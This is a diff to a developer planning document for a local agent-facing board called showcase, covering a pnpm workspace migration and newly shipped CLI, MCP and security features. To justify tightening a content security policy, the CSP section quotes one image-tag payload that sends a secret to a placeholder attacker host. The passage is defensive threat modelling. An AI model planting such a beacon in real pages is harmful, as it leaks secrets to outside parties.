@@ -82,9 +82,9 @@ The form factor is built and was dogfooded against a real Java PR
 ### Run & verify
 
 - Pinned Node: `export PATH="$HOME/.nvm/versions/node/v24.12.0/bin:$PATH"`.
-  Port **8229**. `npm run dev` builds the viewer + restarts the server on save.
-- Gate before "done": `npm run typecheck`, `npm test`, `npm run lint` (warnings =
-  errors), `npm run format:check`. For UI, screenshot with a headless Playwright
+  Port **8229**. `pnpm dev` builds the viewer + restarts the server on save.
+- Gate before "done": `pnpm typecheck`, `pnpm test`, `pnpm lint` (warnings =
+  errors), `pnpm format:check`. For UI, screenshot with a headless Playwright
   script and actually look — `http://localhost:8229/session/<reviewSessionId>`.
 
 ### Cautions
@@ -133,15 +133,16 @@ the chrome and the sandboxed part-iframes.
 
 ```sh
 cd ~/personal/showcase
-npm run serve            # API + viewer on http://localhost:8229  (keep running)
+pnpm install             # once after cloning (pnpm workspace)
+pnpm serve               # API + viewer on http://localhost:8229  (keep running)
 # rebuild the viewer + restart after viewer changes:
-npm run build:viewer
-node bin/showcase.js demo   # seed example sessions to look around
+pnpm build:viewer
+node packages/cli/bin/showcase.js demo   # seed example sessions to look around
 ```
 
 **Create a surface** — in Cursor/Claude Code, ask "diagram X on showcase" /
 "sketch this on showcase"; the agent calls `publish_surface` and a card appears.
-Or directly: `node bin/showcase.js mermaid flow.mmd --title "Flow"` (also
+Or directly: `node packages/cli/bin/showcase.js mermaid flow.mmd --title "Flow"` (also
 `publish`, `diff`, `markdown`, `code`, `image`, …).
 
 **Iterate** — the agent calls `update_surface {id, parts}` → _same card, new
@@ -153,12 +154,19 @@ local API), pinned to the v24 node binary:
 
 - Claude Code — user scope in `~/.claude.json`, `SHOWCASE_AGENT=claude-code`.
 - Cursor — global `~/.cursor/mcp.json`, `SHOWCASE_AGENT=cursor`.
-  Only requirement: keep `npm run serve` running, then talk to either agent.
+  Only requirement: keep `pnpm serve` running, then talk to either agent.
   Restart the editor after MCP config changes.
 
 ---
 
 ## 3. Architecture map
+
+> **Workspace note:** the code is now a pnpm workspace — the files below moved
+> into `packages/{core,server,mcp,cli,viewer}/` (the runtime-agnostic half —
+> `types`, `surfacePage`, `themes`, `kits`, `blueprints`, `events`, `mcpSpec`,
+> `export` — is `@showcase/core`; `app`/`storage`/`mcpHttp`/`index` are
+> `@showcase/server`). Paths below are written in the pre-split form for brevity;
+> `AGENTS.md` has the canonical package map.
 
 - `server/app.ts` — Hono app (runtime-agnostic): routes, SSE `/api/events`,
   long-poll `/api/comments`, the `/s/:id` sandboxed renderer, and the shared
@@ -207,10 +215,10 @@ The agent receives it when it next touches showcase:
   `<iframe>`s, and `.thread .cmt.user` carrying the comment text) so it survives
   a restyle but catches a broken change. **Keep these hooks intact.** (Gap: desktop-chromium
   only — see Pillar F.)
-- **Verify before reporting done** (all must pass): `npm run typecheck`
-  (node + viewer tsc), `npm run lint` (oxlint, warnings = errors),
-  `npm run build:viewer`, `npx playwright test`. For UI, screenshot via a headless
-  Playwright script and look at it. `npm run format` last.
+- **Verify before reporting done** (all must pass): `pnpm typecheck`
+  (root test program + `pnpm -r typecheck`), `pnpm lint` (oxlint + core no-`node:`
+  boundary, warnings = errors), `pnpm build:viewer`, `npx playwright test`. For UI,
+  screenshot via a headless Playwright script and look at it. `pnpm format` last.
 - **Node:** prefix shells with a pinned v24 on PATH, e.g.
   `export PATH="$HOME/.nvm/versions/node/v24.14.1/bin:/usr/bin:/bin:/usr/local/bin"`.
   This shell aliases `cat`→a missing tool (use Read/`sed`) and lacks `lsof`
@@ -362,10 +370,14 @@ deepen Workflow 2. Each is independent and opt-in to pick up; grouped by theme.
 
 **Housekeeping**
 
-- **Asset lifecycle / GC** — eviction only runs eagerly on upload; orphaned assets
-  (referenced by no live or historical surface) accumulate until the board budget
-  forces LRU. Add a lazy GC pass (`isAssetReferenced` already exists), a
-  `showcase gc` command, and a board-size status line. _Effort: low._
+- **✅ Shipped — Asset lifecycle / GC.** Eager upload eviction only fires under
+  budget pressure, so orphaned assets (referenced by no live or historical
+  surface) used to sit resident until then. Now `Store.gcAssets()` (a lazy sweep
+  reusing `referencedAssetIds`) + `Store.boardStats()` back two routes —
+  `POST /api/board/gc` and `GET /api/board` — surfaced as **`showcase gc`**
+  (`--dry-run` previews, `--json` for scripting) and **`showcase board`** (the
+  one-line size tally: sessions · surfaces · comments · reviews · assets
+  (bytes / budget) · orphaned). Covered by store-contract, API, and CLI tests.
 
 **Quality & trust**
 
@@ -373,25 +385,48 @@ deepen Workflow 2. Each is independent and opt-in to pick up; grouped by theme.
   sandboxed iframes, there's no a11y story: iframe titles, focus order across
   cards, contrast on the tone chips, screen-reader labels on the decision queue. A
   deliberate WCAG pass is table stakes. _Effort: medium._
-- **Operational observability** — the CLI installs showcase as a launchd/systemd
-  service, but there's no `/api/health`, no structured logging, and update-check
-  failures are silent. Add a health endpoint, structured request logging, and a
-  self-rendered "board status" surface (uptime, surface/asset counts, store size,
-  last error) — showcase dogfooding its own monitoring. _Effort: low–medium._
-- **Tighten the html-part CSP + write down the threat model** — the sandbox
-  invariant is solid. The CDN allowlist and `connect-src` are now gone (parts run
-  inline-only with no external origins), but `img/media` still allow wide
-  `https:`/`data:`/`blob:` sources. Narrow those, add a `docs/SECURITY.md` threat
-  model, and wire the `security-review` skill into a recurring check.
-  _Effort: low–medium._
+- **✅ Shipped — Operational observability.** The CLI installs showcase as a
+  launchd/systemd service but had no liveness signal. Now an owner-scoped
+  **`GET /api/health`** reports `{ status, uptimeMs, version, board, lastError }`
+  — liveness plus the board tally plus the last unhandled error (message + when;
+  `app.onError` records it, `status` flips `ok`→`degraded`), surfaced as
+  **`showcase health`** (human one-liner + `--json`). **Structured request
+  logging** is an opt-in middleware (one JSON line per `/api`/`/mcp` request —
+  method · path · status · ms; `/api/health` excluded so a polling monitor
+  doesn't flood it), wired from `SHOWCASE_LOG=1` in `index.ts` and off by default
+  so the local board stays quiet. Covered by API + CLI tests. _Remaining (cut for
+  now): a self-rendered "board status" surface — `showcase health` covers the
+  need; revisit only if an in-board monitoring card is wanted. Update-check
+  failures staying silent is intentional (this fork has no published release)._
+- **✅ Shipped — Tightened the html-part CSP + wrote the threat model.** `img-src`
+  / `media-src` dropped the wildcard **`https:`** scheme (both `buildCsp` and
+  `buildRichCsp` in `surfacePage.ts`): a bare `https:` source is a URL-borne
+  exfil channel even with scripts boxed and `connect-src` closed
+  (`<img src="https://attacker/?b=<secret>">`), so images/media are now `data:` /
+  `blob:` / this board's `origin` only — no external host appears anywhere in the
+  policy. Backed by `test/surfacePage.test.ts` regression assertions (no wildcard
+  scheme in img/media). The full trust model — invariant, sandbox attribute, CSP,
+  the host bridge, auth, CSRF guard, residual risks — is now **`docs/SECURITY.md`**
+  (linked from `AGENTS.md`), which also records the maintenance rule: run the
+  `security-review` skill over any diff touching the sandbox/CSP/bridge/auth.
 
 **Extensibility ergonomics**
 
-- **Schema validation + `showcase validate`** — `userConfig.ts` validates only
-  rough shape; a malformed palette color or blueprint section is skipped with a
-  boot warning and no author-facing error. Ship JSON schemas + a `showcase
-validate` command so theme/kit/blueprint authors (`docs/themable-explainers.md`)
-  get real errors before publishing. _Effort: low._
+- **✅ Shipped — Schema validation + `showcase validate`.** `userConfig.ts` used
+  to validate only rough shape, so a malformed palette color or misspelled slot
+  was skipped (or rendered as a silent empty CSS var) with no author-facing
+  error. Now `@showcase/core/configSchema.ts` holds **zod schemas** for all four
+  config kinds (theme / kit / blueprint / config.json) — one source of truth used
+  in two places: boot loading (`userConfig.ts` warns each `path: message` issue
+  and skips) and `POST /api/config/validate`, surfaced as **`showcase validate`**
+  (`--json` for CI; non-zero exit on any invalid file). It reads the same
+  user (`~/.showcase`) + repo (`<cwd>/.showcase`) dirs the server loads, posts
+  each file's content, and reports per-file ✓/✗ with located errors. The CSS-color
+  refinement accepts hex / functional notations / `var()` / named colors and
+  rejects garbage; palette + accent objects are `.strict()` so a typo'd slot is
+  flagged. _Note: this tightened boot validation — a partial-palette theme that
+  previously loaded with gaps is now skipped with a clear warning._ Covered by
+  core-schema, API, and CLI tests.
 - **✅ Shipped — expose board state to the agent via MCP resources/prompts.** Both
   transports now advertise `resources` + `prompts` capabilities. Surfaces are
   browsable/attachable as `showcase://surface/<id>` resources (`resources/list` +
@@ -408,7 +443,10 @@ validate` command so theme/kit/blueprint authors (`docs/themable-explainers.md`)
   "pnpm monorepo") are folded into it. The full plan — target package layout, the
   per-surface designs, the migration sequencing, and the open decisions — lives in
   **[§6.A below](#6a--platform-split-track-pnpm-monorepo--best-in-class-cli--mcp--viewer)**.
-  _Effort: large; do the monorepo split first, then the three surfaces on top of it._
+  **✅ Move 0 (the workspace split) is shipped** — five `@showcase/*` packages,
+  green on all gates, behavior-preserving. Moves 1–3 (per-surface reworks) inherited
+  their structural wins from it and are now additive-quality follow-ups; see §6.A.
+  _Effort: large; the split is done — the three surface reworks remain._
 
 #### 6.A — Platform-split track: pnpm monorepo + best-in-class CLI / MCP / viewer
 
@@ -430,9 +468,18 @@ validate` command so theme/kit/blueprint authors (`docs/themable-explainers.md`)
 > `commands/load-test/tui/`, and a separate `website/` (Next.js). Curly is a single
 > package, not a monorepo — borrow its **command layout**, not its packaging.
 
-##### Move 0 — pnpm workspace split (do this first)
+##### Move 0 — pnpm workspace split ✅ SHIPPED
 
-Target layout (names illustrative; `@showcase/*` scope):
+**Done.** The repo is a pnpm workspace of five `@showcase/*` packages — exactly
+the layout below. Cross-package imports use package names (per-package `exports`
+map `./*: ./*.ts`), which Node type-strips across the workspace symlink with no
+build step. Open decisions were resolved with the user: **pnpm** (not npm
+workspaces), **plain root scripts** (no turbo). The viewer-artifact question is
+answered by a `@showcase/viewer` `server-entry` that resolves its own built
+`dist/index.html`, so the server reads it without hard-coding the layout. The
+runtime-agnostic boundary is CI-enforced (`scripts/check-core-boundary.mjs` fails
+the lint gate on any `node:` import in core). All gates green; the e2e oracle is
+identical to the pre-split baseline (behavior-preserving). The shipped layout:
 
 ```
 showcase/
@@ -492,11 +539,12 @@ Things that must survive the split:
 
 ##### Move 1 — best-in-class CLI (`packages/cli`)
 
-**✅ Mostly shipped — the command-layout rework landed; only the package move
-remains.** The old single ~1400-line `bin/showcase.js` was reworked into a real
-CLI in the **current single-package layout** under `cli/` (the pnpm split is
-Move 0; this move was done on top of today's tree, so it relocates into
-`packages/cli` as part of move 0 rather than blocking on it). Modeled on curly:
+**✅ Shipped — the command-layout rework landed and the package move is done**
+(`packages/cli`, relocated as part of Move 0). The old single ~1400-line
+`bin/showcase.js` was reworked into a real CLI modeled on curly. It is strictly
+zero-dep and imports nothing from other packages (talks to the server over HTTP),
+so the package boundary holds without effort. _Optional polish remaining: add
+color/tables to the human output._ The shipped shape:
 
 - **Command router** ✅ — `bin/showcase.js` is now a thin launcher into
   `cli/main.ts`; a **command registry** (`cli/registry.ts`) holds one `Command`
@@ -518,9 +566,8 @@ Move 0; this move was done on top of today's tree, so it relocates into
   rework stayed **strictly zero-dep** (node built-ins only) and type-stripped like
   the server; no arg-parser/framework added. Note: the publish-family `--json`
   _part_ flag was renamed `--json-part` to free the global `--json`.
-- **Remaining:** relocate `cli/` into `packages/cli` (imports _types only_ from
-  `@showcase/core`, must not pull the viewer's React/Vite tree) when Move 0 lands;
-  optionally add color/tables to the human output.
+- **Package move** ✅ — `cli/` now lives in `packages/cli` (zero-dep, no viewer
+  tree). _Optional polish remaining: color/tables in the human output._
 
 ##### Move 2 — best-in-class MCP (`packages/mcp` + the server's HTTP transport)
 
@@ -528,30 +575,47 @@ The MCP already has two transports (stdio in `mcp/`, streamable-HTTP at `/mcp`) 
 already advertises **resources** (`showcase://surface/<id>`) and **prompts**
 (`review_pr`, `explainer`). Best-in-class means tightening, not rebuilding:
 
-- **One schema, two transports** — `mcpSpec.ts` moves to `@showcase/core` as the
-  single source of truth for tool schemas + field docs + prompt text; both the stdio
-  server and `mcpHttp.ts` import it. (Partly true today — make it total.)
-- **Typed + validated** — every tool input/output backed by a `zod` schema with
-  structured, actionable error responses (not stringly-typed failures).
-- **Round-trip completeness** — `get_surface` (content read-back) is shipped; extend
-  resources to **sessions** and **assets**, and confirm `update_surface` in-place
-  revision stays the iterate path. Keep tool descriptions excellent — the agent's
-  behavior is downstream of them.
-- **Per-tool tests** on both transports (extend `test/api.test.ts`'s "mcp read-back"
-  to cover each tool + resource + prompt), so the spec can't drift from either
-  transport.
+- **One schema, two transports** ✅ — `mcpSpec.ts` now lives in `@showcase/core`
+  as the single source of truth for tool schemas + field docs + prompt text; both
+  the stdio server (`packages/mcp`) and `mcpHttp.ts` import it from there.
+- **Typed + validated** ✅ — the stdio transport already validated via the SDK;
+  the hand-rolled streamable-HTTP transport now does too. `mcpSpec.ts` exports
+  `HTTP_MCP_TOOL_SCHEMAS` (one zod schema per tool, reusing the stdio shapes +
+  the HTTP routing envelope) and `validateToolInput`/`formatZodIssues`; `mcpHttp.ts`
+  validates each `tools/call` before dispatch and returns a structured
+  **`-32602 invalid arguments for <tool>: <field>: <issue>`** instead of a
+  stringly-typed failure deep in a flow. Part-bearing fields (`parts`,
+  `decisions`, `manifest`, preset bodies) stay LOOSE on purpose — the publish flow
+  and `coerceReview` already coerce/validate them leniently — so the gate checks
+  the envelope + scalar enums without false-rejecting a valid chart/code/json part.
+- **Round-trip completeness** ✅ — resources now cover **sessions**
+  (`showcase://session/<id>` → metadata + surface index) and **assets**
+  (`showcase://asset/<id>` → bytes as a base64 blob) on BOTH transports, alongside
+  the existing surfaces; `resources/templates/list` advertises all three. A new
+  owner-scoped `GET /api/sessions/:id/assets` (metadata only) backs the stdio
+  asset listing (the thin client can't reach the store); stdio asset reads fetch
+  the bytes via an authed binary `fetchAssetBlob`. `get_surface` + `update_surface`
+  remain the read→revise iterate path.
+- _Remaining (optional):_ extend the per-tool test matrix to the stdio transport
+  process directly (the HTTP transport + shared core are covered in
+  `test/api.test.ts`), and keep tool descriptions sharp.
+- **Per-tool tests** ✅ (HTTP) — `test/api.test.ts` covers the input-validation
+  gate (missing field, bad enum, loose-part pass-through) and the session/asset
+  resource list + read; the stdio-process matrix is the optional remainder above.
 - Consider, only if a need shows up: **elicitation/sampling** for the comment→agent
-  loop, and an MCP-level health/capability probe.
+  loop. (An MCP-level health probe is now covered by `/api/health` / `showcase
+  health`.)
 
 ##### Move 3 — best-in-class viewer (`packages/viewer`)
 
 Already React 19 + zustand + Tailwind v4 + vendored shadcn, Vite → one self-contained
 `index.html`. Best-in-class here is about isolation, contract, and quality:
 
-- **Isolated dep tree** — the React/Vite/shadcn stack lives only in `@showcase/viewer`
-  so the CLI and stdio MCP stay lean and publishable without it.
-- **Typed wire contract** — import surface/part types from `@showcase/core` instead of
-  re-declaring them, so a server-side model change breaks the viewer build (good).
+- **Isolated dep tree** ✅ — the React/Vite/shadcn stack lives only in
+  `@showcase/viewer`; the CLI and stdio MCP carry none of it.
+- **Typed wire contract** ✅ — the viewer imports surface/part types from
+  `@showcase/core` (no re-declaration), so a server-side model change breaks the
+  viewer build.
 - **Keep the single-file artifact** — it's a feature (the server serves one file); do
   _not_ code-split. Note the tension with bundle growth and revisit only if it bites.
 - **Component/unit tests** — add `vitest` + Testing Library for the part renderers
@@ -563,27 +627,26 @@ Already React 19 + zustand + Tailwind v4 + vendored shadcn, Vite → one self-co
 
 ##### Sequencing & open decisions
 
-**Order:** (0) workspace split with packages 1:1 to today's folders and _no behavior
-change_ — get green on `typecheck`/`test`/`lint`/oracle first; **then** (1) CLI, (2)
-MCP, (3) viewer independently, each its own series of small commits. Don't combine
-the structural move with a surface rework — land the split boringly first.
+**Order:** (0) workspace split ✅ — landed boringly, behavior-preserving, green on
+`typecheck`/`test`/`lint`/oracle. **Then** (1) CLI, (2) MCP, (3) viewer
+independently, each its own series of small commits.
 
-**Open decisions to flag before starting** (see also §7):
+**Open decisions — all resolved when Move 0 landed:**
 
-- **`pnpm` migration itself** — replaces `npm` + the root `package-lock.json`;
-  confirm the user wants `pnpm` (vs. `npm` workspaces) before converting CLAUDE.md's
-  `npm run …` muscle-memory and the dev scripts.
-- **`turbo` (or not)** — task-graph + caching vs. keeping a few plain root scripts.
-  Lean "not yet" unless the per-package task graph genuinely hurts.
-- **CLI zero-dep stance** — keep it strictly zero-dep, or allow one small vetted
-  arg-parser/output helper now that it's a standalone publishable package? Weigh
-  against the install-friction goal.
-- **Viewer-artifact resolution** — how `@showcase/server` locates the built
-  `index.html` across the workspace boundary (resolved `node_modules` path vs. a
-  viewer-exported entry).
+- **`pnpm` migration** ✅ DECIDED — pnpm workspace (not npm workspaces);
+  `package-lock.json` is gone, `pnpm-lock.yaml` is the lockfile, and the
+  `npm run …` muscle-memory maps 1:1 to `pnpm …`.
+- **`turbo` (or not)** ✅ DECIDED — not yet. Plain root scripts + `pnpm -r`; revisit
+  only if the per-package task graph genuinely hurts.
+- **CLI zero-dep stance** ✅ DECIDED — kept strictly zero-dep.
+- **Viewer-artifact resolution** ✅ DECIDED — a `@showcase/viewer` `server-entry`
+  resolves its own built `dist/index.html`; the server imports the path, staying
+  ignorant of the workspace layout (chosen over a hard-coded `node_modules` path).
 
-_Effort: large. Treat move 0 as a self-contained PR; moves 1–3 as independent
-follow-ups that can land in any order once the workspace exists._
+_Effort: Move 0 done. Moves 1–3 are independent additive-quality follow-ups that can
+land in any order — much of their structural intent already came for free with the
+split (CLI isolated & zero-dep, viewer dep tree isolated + typed wire contract, one
+MCP schema in core)._
 
 _Deferred / punted (revisit later):_ a **durable searchable store** (SQLite +
 FTS5) for referencing old mockups/reviews — `JsonFileStore` is fine at personal
